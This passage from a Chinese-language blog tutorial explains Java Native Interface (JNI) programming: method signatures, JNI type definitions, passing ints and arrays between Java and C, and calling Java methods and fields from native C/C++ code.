class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">helloFromJava</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"hello from java"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">//C调用java中的带两个int参数的方法  </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">Add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> x + y;  </span><br><span class="line">    &#125;  </span><br><span class="line">      </span><br><span class="line">    <span class="comment">//C调用java中参数为string的方法  </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printString</span><span class="params">(String s)</span></span>&#123;  </span><br><span class="line">        System.out.println(s);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><ul><li>返回值null, 参数null : void helloFromJava() 方法的签名是 “()V”, 括号里什么都没有代表参数为null, V代表返回值是void;</li><li>返回值int, 参数两个int : int Add(int x,int y) 方法的签名是 “(II)I”, 括号中II表示两个int类型参数, 右边括号外的I代表返回值是int类型;</li><li>返回值null, 参数String : void printString(String s) 方法签名是 “(Ljava/lang/String;)V”, 括号中的Ljava/lang/String; 表示参数是String类型, V表示返回值是void;</li></ul><h2 id="Java中调用JNI"><a href="#Java中调用JNI" class="headerlink" title="Java中调用JNI"></a>Java中调用JNI</h2><h3 id="JNI数据类型"><a href="#JNI数据类型" class="headerlink" title="JNI数据类型"></a>JNI数据类型</h3><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo89hw3cstj30pw0cewfe.jpg" alt=""><br>数据类型表示方法 : int数组类型 jintArray , boolean数组 jbooleanArray …<br>头文件定义类型 : 这些基本的数据类型在<a href="https://android.googlesource.com/platform/libnativehelper/+/brillo-m9-dev/include/nativehelper/jni.h" target="_blank" rel="noopener">jni.h</a> 中都有相应的定义 :<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Primitive types that match up with Java equivalents. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span>  jboolean; <span class="comment">/* unsigned 8 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int8_t</span>   jbyte;    <span class="comment">/* signed 8 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> jchar;    <span class="comment">/* unsigned 16 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int16_t</span>  jshort;   <span class="comment">/* signed 16 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  jint;     <span class="comment">/* signed 32 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int64_t</span>  jlong;    <span class="comment">/* signed 64 bits */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span>    jfloat;   <span class="comment">/* 32-bit IEEE 754 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span>   jdouble;  <span class="comment">/* 64-bit IEEE 754 */</span></span><br><span class="line"><span class="comment">/* "cardinal indices and sizes" */</span></span><br><span class="line"><span class="keyword">typedef</span> jint     jsize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reference types, in C++</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jobject</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jclass</span> :</span> <span class="keyword">public</span> _jobject &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jstring</span> :</span> <span class="keyword">public</span> _jobject &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jarray</span> :</span> <span class="keyword">public</span> _jobject &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jobjectArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jbooleanArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jbyteArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jcharArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jshortArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jintArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jlongArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jfloatArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jdoubleArray</span> :</span> <span class="keyword">public</span> _jarray &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> _<span class="title">jthrowable</span> :</span> <span class="keyword">public</span> _jobject &#123;&#125;;</span><br><span class="line"><span class="keyword">typedef</span> _jobject*       jobject;</span><br><span class="line"><span class="keyword">typedef</span> _jclass*        jclass;</span><br><span class="line"><span class="keyword">typedef</span> _jstring*       jstring;</span><br><span class="line"><span class="keyword">typedef</span> _jarray*        jarray;</span><br><span class="line"><span class="keyword">typedef</span> _jobjectArray*  jobjectArray;</span><br><span class="line"><span class="keyword">typedef</span> _jbooleanArray* jbooleanArray;</span><br><span class="line"><span class="keyword">typedef</span> _jbyteArray*    jbyteArray;</span><br><span class="line"><span class="keyword">typedef</span> _jcharArray*    jcharArray;</span><br><span class="line"><span class="keyword">typedef</span> _jshortArray*   jshortArray;</span><br><span class="line"><span class="keyword">typedef</span> _jintArray*     jintArray;</span><br><span class="line"><span class="keyword">typedef</span> _jlongArray*    jlongArray;</span><br><span class="line"><span class="keyword">typedef</span> _jfloatArray*   jfloatArray;</span><br><span class="line"><span class="keyword">typedef</span> _jdoubleArray*  jdoubleArray;</span><br><span class="line"><span class="keyword">typedef</span> _jthrowable*    jthrowable;</span><br><span class="line"><span class="keyword">typedef</span> _jobject*       jweak;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* not __cplusplus */</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reference types, in C.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>*           jobject;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jclass;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jstring;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jarray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jobjectArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jbooleanArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jbyteArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jcharArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jshortArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jintArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jlongArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jfloatArray;</span><br><span class="line"><span class="keyword">typedef</span> jarray          jdoubleArray;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jthrowable;</span><br><span class="line"><span class="keyword">typedef</span> jobject         jweak;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* not __cplusplus */</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">jfieldID</span>;</span>                       <span class="comment">/* opaque structure */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">jfieldID</span>* <span class="title">jfieldID</span>;</span>     <span class="comment">/* field IDs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">jmethodID</span>;</span>                      <span class="comment">/* opaque structure */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">jmethodID</span>* <span class="title">jmethodID</span>;</span>   <span class="comment">/* method IDs */</span></span><br></pre></td></tr></table></figure></p><h3 id="JNI在Java和C语言之间传递int类型"><a href="#JNI在Java和C语言之间传递int类型" class="headerlink" title="JNI在Java和C语言之间传递int类型"></a>JNI在Java和C语言之间传递int类型</h3><p>Java中定义的方法 :<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将Java中的两个int值 传给C语言, 进行相加后, 返回java语言</span></span><br><span class="line"><span class="comment">//shuliang.han.ndkparameterpassing.DataProvider  </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br></pre></td></tr></table></figure></p><p>java中调用<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.add:  </span><br><span class="line">    <span class="keyword">int</span> result = dataProvider.add(<span class="number">1</span>, <span class="number">2</span>);  </span><br><span class="line">    Toast.makeText(getApplicationContext(), <span class="string">"the add result : "</span> + result, Toast.LENGTH_LONG).show();  </span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><p>C语言中定义的方法 :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//方法签名, Java环境 和 调用native方法的类 必不可少, 后面的参数就是native方法的参数  </span></span><br><span class="line"><span class="function">jint <span class="title">Java_shuliang_han_ndkparameterpassing_DataProvider_add</span><span class="params">(JNIEnv * env, jobject obj, jint x, jint y)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> x + y;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="数组参数处理"><a href="#数组参数处理" class="headerlink" title="数组参数处理"></a>数组参数处理</h3><ul><li>获取数组长度方法 : jni中定义 - <code>jsize (*GetArrayLength)(JNIEnv*, jarray)</code>;</li><li><p>创建数组的相关方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jbooleanArray (*NewBooleanArray)(JNIEnv*, jsize);    </span><br><span class="line">jbyteArray    (*NewByteArray)(JNIEnv*, jsize);    </span><br><span class="line">jcharArray    (*NewCharArray)(JNIEnv*, jsize);    </span><br><span class="line">jshortArray   (*NewShortArray)(JNIEnv*, jsize);    </span><br><span class="line">jintArray     (*NewIntArray)(JNIEnv*, jsize);    </span><br><span class="line">jlongArray    (*NewLongArray)(JNIEnv*, jsize);    </span><br><span class="line">jfloatArray   (*NewFloatArray)(JNIEnv*, jsize);    </span><br><span class="line">jdoubleArray  (*NewDoubleArray)(JNIEnv*, jsize);</span><br></pre></td></tr></table></figure></li><li><p>获取数组元素相关方法 : </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jboolean*   (*GetBooleanArrayElements)(JNIEnv*, jbooleanArray, jboolean*);    </span><br><span class="line">jbyte*      (*GetByteArrayElements)(JNIEnv*, jbyteArray, jboolean*);    </span><br><span class="line">jchar*      (*GetCharArrayElements)(JNIEnv*, jcharArray, jboolean*);    </span><br><span class="line">jshort*     (*GetShortArrayElements)(JNIEnv*, jshortArray, jboolean*);    </span><br><span class="line">jint*       (*GetIntArrayElements)(JNIEnv*, jintArray, jboolean*);    </span><br><span class="line">jlong*      (*GetLongArrayElements)(JNIEnv*, jlongArray, jboolean*);    </span><br><span class="line">jfloat*     (*GetFloatArrayElements)(JNIEnv*, jfloatArray, jboolean*);    </span><br><span class="line">jdouble*    (*GetDoubleArrayElements)(JNIEnv*, jdoubleArray, jboolean*);</span><br></pre></td></tr></table></figure></li></ul><p><strong>example</strong><br>c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jintArray <span class="title">Java_shuliang_han_ndkparameterpassing_DataProvider_intMethod</span><span class="params">(JNIEnv *env, jobject obj, jintArray arr)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="comment">//获取arr大小    </span></span><br><span class="line">    <span class="keyword">int</span> len = (*env)-&gt;GetArrayLength(env, arr);    </span><br><span class="line">        </span><br><span class="line">    <span class="comment">//在LogCat中打印出arr的大小    </span></span><br><span class="line">    LOGI(<span class="string">"the length of array is %d"</span>, len);    </span><br><span class="line">        </span><br><span class="line">    <span class="comment">//如果长度为0, 返回arr    </span></span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">0</span>)    </span><br><span class="line">        <span class="keyword">return</span> arr;    </span><br><span class="line">            </span><br><span class="line">    <span class="comment">//如果长度大于0, 那么获取数组中的每个元素    </span></span><br><span class="line">    jint* p = (*env)-&gt;GetIntArrayElements(env, arr, <span class="number">0</span>);    </span><br><span class="line">        </span><br><span class="line">    <span class="comment">//打印出数组中每个元素的值    </span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;    </span><br><span class="line">    <span class="keyword">for</span>(; i &lt; len; i ++)    </span><br><span class="line">    &#123;    </span><br><span class="line">        LOGI(<span class="string">"arr[%d] = %d"</span>, i, *(p + i));    </span><br><span class="line">    &#125;    </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> arr;    </span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.intMethod:    </span><br><span class="line">    <span class="keyword">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;    </span><br><span class="line">    dataProvider.intMethod(array);    </span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p><h2 id="C代码回调Java方法或者使用java类的字段"><a href="#C代码回调Java方法或者使用java类的字段" class="headerlink" title="C代码回调Java方法或者使用java类的字段"></a>C代码回调Java方法或者使用java类的字段</h2><p>C语言回调Java方法场景 : </p><ul><li>复用方法 : 使用Java对象, 复用Java中的方法;</li><li>激活Java : C程序后台运行, 该后台程序一直运行, 某个时间出发后需要启动Java服务, 激活Android中的某个界面, 例如使用Intent启动一个Activity;</li></ul><h3 id="1-找到java对应的Class"><a href="#1-找到java对应的Class" class="headerlink" title="1 找到java对应的Class"></a>1 找到java对应的Class</h3><p>为了能够在C/C++中使用Java类，jni.h头文件中专门定义了jclass类型来表示Java中的Class类<br>JNIEnv类中有如下几个简单的函数可以取得jclass:</p><ul><li><p><code>jclass FindClass(const char* clsName)</code>:通过类的名称(类的全名，这时候包名不是用.号，而是用/来区分的)来获取jclass<br>如: <code>jclass str = env-&gt;FindClass(“java/lang/String”)</code>;获取Java中的String对象的class对象。</p></li><li><p><code>jclass GetObjectClass(jobject obj)</code>:通过对象实例来获取jclass，相当于java中的getClass方法</p></li><li><p><code>jclass GetSuperClass(jclass obj)</code>:通过jclass可以获取其父类的jclass对象</p></li></ul><p><em>在C/C++本地代码中访问Java端的代码，一个常见的应用就是获取类的属性和调用类的方法，为了在C/C++中表示属性和方法，JNI在jni.h头文件中定义了jfieldId,jmethodID类型来分别代表Java端的属性和方法</em></p><h3 id="2-1-找到要使用的java字段的fieledID和使用"><a href="#2-1-找到要使用的java字段的fieledID和使用" class="headerlink" title="2.1 找到要使用的java字段的fieledID和使用"></a>2.1 找到要使用的java字段的fieledID和使用</h3><p>使用JNIEnv的：<br>GetFieldID/GetMethodID<br>GetStaticFieldID/GetStaticMethodID<br>来取得相应的jfieldID和jmethodID</p><p>下面来具体看一下这几个方法：</p><p><code>GetFieldID(jclass clazz,const char* name,const char* sign)</code></p><p>方法的参数说明:</p><p>clazz:这个简单就是这个字段依赖的类对象的class对象</p><p>name:这个是这个字段的名称</p><p>sign:这个是这个字段的签名(我们知道每个变量，每个方法都是有签名的)</p><p><strong>例子：在Java代码中定义一个属性，然后再C++代码中将其设置成另外的值，并且输出来</strong><br>java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jni.demo;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNIDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number = <span class="number">0</span>;<span class="comment">//定义一个属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个本地方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用动态链接库</span></span><br><span class="line">        System.loadLibrary(<span class="string">"JNIDemo"</span>);</span><br><span class="line">        JNIDemo jniDemo = <span class="keyword">new</span> JNIDemo();</span><br><span class="line">        jniDemo.sayHello();</span><br><span class="line">        System.out.print(jniDemo.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>c++<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_jni_demo_JNIDemo.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_com_jni_demo_JNIDemo_sayHello</span> <span class="params">(JNIEnv * env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取obj中对象的class对象</span></span><br><span class="line">    jclass clazz = env-&gt;GetObjectClass(obj);</span><br><span class="line">    <span class="comment">//获取Java中的number字段的id(最后一个参数是number的签名)</span></span><br><span class="line">    jfieldID id_number = env-&gt;GetFieldID(clazz,<span class="string">"number"</span>,<span class="string">"I"</span>);</span><br><span class="line">    <span class="comment">//获取number的值</span></span><br><span class="line">    jint number = env-&gt;GetIntField(obj,id_number);</span><br><span class="line">    <span class="comment">//输出到控制台</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;number&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//修改number的值为100,这里要注意的是jint对应C++是long类型,所以后面要加一个L</span></span><br><span class="line">    env-&gt;SetIntField(obj,id_number,<span class="number">100L</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-2-找到要调用的方法的methodID"><a href="#2-2-找到要调用的方法的methodID" class="headerlink" title="2.2 找到要调用的方法的methodID"></a>2.2 找到要调用的方法的methodID</h3><p><code>GetMethodID(jclass clazz,const char* name,const char* sign)</code></p><p>方法的参数说明:</p><p>clazz:这个简单就是这个方法依赖的类对象的class对象</p><p>name:这个是这个方法的名称</p><p>sign:这个是这个方法的签名(我们知道每个变量，每个方法都是有签名的)</p><h3 id="3-在C语言中调用相应方法"><a href="#3-在C语言中调用相应方法" class="headerlink" title="3 在C语言中调用相应方法"></a>3 在C语言中调用相应方法</h3><p>JNIEnv提供了众多的Call<type>Method和CallStatic<type>Method，还有CallNonvirtual<type>Method函数， 需要通过GetMethodID取得相应方法的jmethodID来传入到上述函数的参数中</type></type></type></p><p>调用示例方法的三种形式:</p><ul><li><p>Call<type>Method(jobject obj,jmethodID id,….);第一种是最常用的方式</type></p></li><li><p>Call<type>Method(jobject obj,jmethodID id,va_list lst);第二种是当调用这个函数的时候有一个指向参数表的va_list变量时使用的(很少使用)</type></p></li><li><p>Call<type>Method(jobject obj,jmethodID id,jvalue* v);第三种是当调用这个函数的时候有一个指向jvalue或jvalue数组的指针时用的<br>jvalue在jni.h头文件中定义是一个union联合体，在C/C++中，我们知道union是可以存放不同类型的值，但是当你给其中一个类型赋值之后，这个union就是这种类型了，比如你给jvalue中的s赋值的话， jvalue就变成了jshort类型了，所以我们可以定义一个jvalue数组(这样就可以包含多种类型的参数了)传递到方法中。<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo8b17xs19j305r05bwfa.jpg" alt=""></type></p></li></ul><p>假如现在Java中有这样的一个方法:</p><p>boolean function(int a,double b,char c)</p><p>{</p><p>……..</p><p>}<br>(1) 在C++中使用第一种方式调用function方法:</p><p><code>env-&gt;CallBooleanMethod(obj , id_function , 10L, 3.4 , L’a’)</code></p><p>id_function是方法function的id;可以通过GetMethodID()方法获取</p><p>然后就是对应的参数，这个和Java中的可变参数类似，对于最后一个char类型的参数L’a’,为什么前面要加一个L,原因是Java中的字符时Unicode双字节的，而C++中的字符时单字节的，所以要变成宽字符，前面加一个L</p><p>(2) 在C++中使用第三种方式调用function方法:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jvalue* args = <span class="keyword">new</span> jvalue[<span class="number">3</span>];<span class="comment">//定义jvalue数组</span></span><br><span class="line"></span><br><span class="line">args[<span class="number">0</span>].i = <span class="number">10L</span>;<span class="comment">//i是jvalue中的jint值</span></span><br><span class="line"></span><br><span class="line">args[<span class="number">1</span>].d = <span class="number">3.44</span>;</span><br><span class="line"></span><br><span class="line">args[<span class="number">2</span>].c = L’a’;</span><br><span class="line"></span><br><span class="line">env-&gt;CallBooleanMethod(obj, id_function, args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>[] args;<span class="comment">//释放指针堆内存</span></span><br></pre></td></tr></table></figure></p><p><strong>例子:C++中调用Java中的方法:</strong></p><p>Java代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">max</span><span class="params">(<span class="keyword">double</span> value1,<span class="keyword">double</span> value2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value1&gt;value2 ? value1:value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在C++中的代码:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_com_jni_demo_JNIDemo_sayHello</span> <span class="params">(JNIEnv * env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//获取obj中对象的class对象</span></span><br><span class="line">    jclass clazz = env-&gt;GetObjectClass(obj);</span><br><span class="line">    <span class="comment">//获取Java中的max方法的id(最后一个参数是max方法的签名)</span></span><br><span class="line">    jmethodID id_max = env-&gt;GetMethodID(clazz,<span class="string">"max"</span>,<span class="string">"(DD)D"</span>);</span><br><span class="line">    <span class="comment">//调用max方法</span></span><br><span class="line">    jdouble doubles = env-&gt;CallDoubleMethod(obj,id_max,<span class="number">1.2</span>,<span class="number">3.4</span>);</span><br><span class="line">    <span class="comment">//输出返回值</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;doubles&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/eternalsakura/ctf_pwn/tree/master/android逆向/Log日志分析源码" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/tree/master/android逆向/Log日志分析源码</a><br><a href="http://blog.csdn.net/shulianghan/article/details/18964835" target="_blank" rel="noopener">http://blog.csdn.net/shulianghan/article/details/18964835</a><br><a href="http://www.wjdiankong.cn/java中jni的使用详解第一篇helloworld/" target="_blank" rel="noopener">http://www.wjdiankong.cn/java中jni的使用详解第一篇helloworld/</a><br><a href="http://www.wjdiankong.cn/java中jni的使用详解第二篇jnienv类型和jobject类型的解释/" target="_blank" rel="noopener">http://www.wjdiankong.cn/java中jni的使用详解第二篇jnienv类型和jobject类型的解释/</a><br><a href="http://www.wjdiankong.cn/java中jni的使用详解第三篇jnienv类型中方法的使用/" target="_blank" rel="noopener">http://www.wjdiankong.cn/java中jni的使用详解第三篇jnienv类型中方法的使用/</a><br><a href="https://android.googlesource.com/platform/libnativehelper/+/brillo-m9-dev/include/nativehelper/jni.h" target="_blank" rel="noopener">https://android.googlesource.com/platform/libnativehelper/+/brillo-m9-dev/include/nativehelper/jni.h</a><br><a href="https://github.com/han1202012/NDKParameterPassing" target="_blank" rel="noopener">https://github.com/han1202012/NDKParameterPassing</a><br><a href="https://github.com/han1202012/NDK_Callback/blob/master/jni/jni.c" target="_blank" rel="noopener">https://github.com/han1202012/NDK_Callback/blob/master/jni/jni.c</a></p>]]></content>
      
      <categories>
          
